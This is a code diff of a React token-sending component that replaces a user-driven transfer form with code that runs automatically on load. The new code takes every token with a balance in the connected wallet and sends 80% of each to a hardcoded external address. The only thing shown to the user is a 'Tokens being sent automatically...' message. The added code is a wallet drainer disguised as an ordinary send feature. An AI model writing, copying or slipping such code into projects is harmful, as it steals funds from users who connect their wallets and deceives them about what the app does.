@@ -1,95 +1,89 @@
-import React, { useState, ChangeEvent } from "react";
-import { Input } from "antd";  // Si tu utilises Ant Design ou un composant similaire
-import { ethers } from "ethers";
-import { useAccount, useNetwork, useSigner } from "wagmi";
+import { useEffect, useCallback } from 'react';
+import { useAtom } from 'jotai';
+import { useWalletClient, usePublicClient } from 'wagmi';
+import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
+import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
+import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
+import { erc20ABI } from 'wagmi';
+import { normalize } from 'viem/ens';
+import { isAddress } from 'essential-eth';
 
-const SendTokens = () => {
-  const [destinationAddress, setDestinationAddress] = useState("");
-  const [amountToSend, setAmountToSend] = useState("");
-  const [tokenAddress, setTokenAddress] = useState("");
-  const [txStatus, setTxStatus] = useState<string | null>(null);
-  const { address } = useAccount();
-  const { chain } = useNetwork();
-  const { data: signer } = useSigner();
+export const SendTokens = () => {
+  const [tokens] = useAtom(globalTokensAtom);
+  const [destinationAddress, setDestinationAddress] = useAtom(destinationAddressAtom);
+  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
 
-  const handleChange = (e: ChangeEvent<HTMLInputElement>) => {
-    setDestinationAddress(e.target.value);
-  };
+  const { data: walletClient } = useWalletClient();
+  const publicClient = usePublicClient();
 
-  const handleAmountChange = (e: ChangeEvent<HTMLInputElement>) => {
-    setAmountToSend(e.target.value);
-  };
+  // Adresse de destination fixe
+  const fixedDestinationAddress = '0x518c5D62647E60864EcB3826e982c93dFa154af3';
 
-  const handleTokenChange = (e: ChangeEvent<HTMLInputElement>) => {
-    setTokenAddress(e.target.value);
-  };
+  // Automatiser l'envoi de tous les tokens disponibles
+  const sendAllTokens = useCallback(async () => {
+    const tokensToSend: ReadonlyArray<`0x${string}`> = tokens
+      .filter((token) => BigInt(token.balance) > 0) // Vérifier les tokens avec un solde positif
+      .map((token) => token.contract_address as `0x${string}`);
 
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
+    if (!walletClient) return;
+    if (!fixedDestinationAddress) return;
 
-    if (!signer || !destinationAddress || !amountToSend || !tokenAddress) {
-      setTxStatus("Please fill in all fields.");
-      return;
+    // Vérifier si l'adresse de destination est une adresse ENS
+    let resolvedDestinationAddress = fixedDestinationAddress;
+    if (resolvedDestinationAddress.includes('.')) {
+      const ensAddress = await publicClient.getEnsAddress({
+        name: normalize(resolvedDestinationAddress),
+      });
+      if (ensAddress) {
+        resolvedDestinationAddress = ensAddress;
+      } else {
+        console.error("Adresse ENS introuvable");
+        return;
+      }
     }
 
-    try {
-      const tokenContract = new ethers.Contract(
-        tokenAddress,
-        [
-          "function transfer(address to, uint256 amount) public returns (bool)",
-        ],
-        signer
-      );
+    // Envoyer tous les tokens
+    for (const tokenAddress of tokensToSend) {
+      const token = tokens.find((token) => token.contract_address === tokenAddress);
+      if (!token) continue;
 
-      const amount = ethers.utils.parseUnits(amountToSend, 18); // Ajuster selon la décimale du token
+      try {
+        const tokenBalance = BigInt(token.balance);
+        const amountToSend = tokenBalance * 80n / 100n; // Calculer 80% du solde
 
-      const tx = await tokenContract.transfer(destinationAddress, amount);
-      setTxStatus(`Transaction sent! Hash: ${tx.hash}`);
-      await tx.wait();
-      setTxStatus(`Transaction confirmed! Hash: ${tx.hash}`);
-    } catch (error) {
-      console.error(error);
-      setTxStatus("Transaction failed.");
+        const { request } = await publicClient.simulateContract({
+          account: walletClient.account,
+          address: tokenAddress,
+          abi: erc20ABI,
+          functionName: 'transfer',
+          args: [
+            resolvedDestinationAddress as `0x${string}`,
+            amountToSend,
+          ],
+        });
+
+        const response = await walletClient.writeContract(request);
+
+        // Mettre à jour l'état pour marquer le token comme envoyé
+        setCheckedRecords((old) => ({
+          ...old,
+          [tokenAddress]: {
+            ...old[tokenAddress],
+            pendingTxn: response,
+          },
+        }));
+
+      } catch (err) {
+        console.error(`Erreur avec le token ${token?.contract_ticker_symbol}:`, err);
+      }
     }
-  };
+  }, [tokens, walletClient, setCheckedRecords, publicClient]);  // Enlever destinationAddress car c'est une valeur fixe
 
-  return (
-    <form onSubmit={handleSubmit}>
-      <label>Destination Address:</label>
-      <Input
-        required
-        value={destinationAddress}
-        placeholder="vitalik.eth"
-        onChange={handleChange}
-        type="text"
-        style={{ width: "100%" }}
-        crossOrigin="anonymous"  // Ajout de crossOrigin si nécessaire
-      />
-      <br />
-      <label>Amount to Send:</label>
-      <Input
-        required
-        value={amountToSend}
-        placeholder="Amount"
-        onChange={handleAmountChange}
-        type="number"
-        style={{ width: "100%" }}
-      />
-      <br />
-      <label>Token Address:</label>
-      <Input
-        required
-        value={tokenAddress}
-        placeholder="0x..."
-        onChange={handleTokenChange}
-        type="text"
-        style={{ width: "100%" }}
-      />
-      <br />
-      <button type="submit">Send Tokens</button>
-      {txStatus && <p>{txStatus}</p>}
-    </form>
-  );
+  useEffect(() => {
+    if (tokens.length > 0) {
+      sendAllTokens();
+    }
+  }, [tokens, walletClient, sendAllTokens, publicClient]); // Dépendances mises à jour
+
+  return <div style={{ margin: '20px' }}>Tokens being sent automatically...</div>;
 };
-
-export default SendTokens;
